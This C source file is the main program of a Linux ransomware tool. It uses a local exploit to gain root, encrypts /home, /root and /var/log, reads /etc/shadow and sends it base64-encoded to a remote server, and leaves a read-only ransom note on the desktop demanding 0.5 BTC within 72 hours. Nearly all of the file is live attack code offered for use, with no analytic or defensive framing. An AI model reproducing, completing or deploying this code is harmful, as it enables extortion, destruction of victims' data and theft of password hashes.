#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <unistd.h>
#include "encrypt.h"
#include "network.h"
#include "exploit.h"

void make_note(void){
    char *username = getlogin();
    char path_fr[100];
    char path_us[100];
    char path_name[1000];
    FILE *fp;
    const char *ransom_note = 
    "Attention!\n\n"
    "All your files, documents, photos, databases, and other important data have been encrypted.\n"
    "Do not attempt to recover them on your own, as this may cause permanent data loss.\n\n"
    "How to restore your files?\n"
    "The only way to recover your files is to purchase a unique decryptor.\n"
    "Only we can provide this decryptor, and only we can restore your data safely.\n\n"
    "Payment instructions:\n"
    "Send 0.5 BTC to the following address:\n"
    "    1FfmbHfnpaZjKFvyi1okTjJJusN455paPH\n\n"
    "After payment, contact us with your unique ID to receive the decryption tool.\n\n"
    "Warning:\n"
    "- You have 72 hours before your decryption key is permanently deleted.\n"
    "- Any attempt to modify the files may result in irreversible damage.\n"
    "- Do not trust third-party recovery tools; they will not work.\n\n"
    "Act fast—your files will be lost forever if you delay.\n";

    snprintf(path_fr, sizeof(path_fr), "/home/%s/Bureau/", username);
    snprintf(path_us, sizeof(path_fr), "/home/%s/Desktop/", username);
    if(opendir(path_fr)){
        snprintf(path_name, sizeof(path_name), "%s/YOUR_FILES_ARE_LOCKED.txt", path_fr);
    }else if (opendir(path_us)){
        snprintf(path_name, sizeof(path_name), "%s/YOUR_FILES_ARE_LOCKED.txt", path_us);
    }else{
        exit(EXIT_FAILURE); 
    }
    fp = fopen(path_name, "w");
    fwrite(ransom_note, sizeof(char), strlen(ransom_note), fp);
    chmod(path_name, 0444);


    fclose(fp);
    exit(EXIT_SUCCESS);
}

void send_shadow(void) {
    long filesize;
    char *buffer;
    char url[100];
    char *file_base64;
    FILE *fp = fopen("/etc/shadow", "r");
    if (!fp) {
        perror("fopen");
        return;
    }

    fseek(fp, 0, SEEK_END);
    filesize = ftell(fp);
    rewind(fp);

    buffer = malloc(filesize + 1);
    if (!buffer) {
        perror("malloc");
        fclose(fp);
        return;
    }

    fread(buffer, 1, filesize, fp);
    buffer[filesize] = '\0';
    file_base64 = base64_encode((const unsigned char *)buffer, filesize);
    snprintf(url, sizeof(url), "http://%s:8000/shadow", SERVER_IP);
    
    send_data("shadow", file_base64, url);
    free(buffer);
    free(file_base64);
    fclose(fp);
}

/*
int main(void){
    unsigned char *aes_key = create_key();

    encrypt_dir("/root/", aes_key);
    encrypt_dir("/home/", aes_key);
    encrypt_dir("/var/log/", aes_key);
    
    make_note();
    free(aes_key);
    return 0;
}
*/
int main(int argc, char *argv[])
{
    unsigned char *aes_key;
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "deploy"))) {
        setuid(0);
        setgid(0);

        aes_key = create_key();
        encrypt_dir("/home/", aes_key);
        encrypt_dir("/root/", aes_key);
        encrypt_dir("/var/log/", aes_key);
        send_shadow();
        make_note();
        
        free(aes_key);
        err(1, "deploy");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "deploy", NULL);
    err(1, "execl %s", BIN_UPPER);
}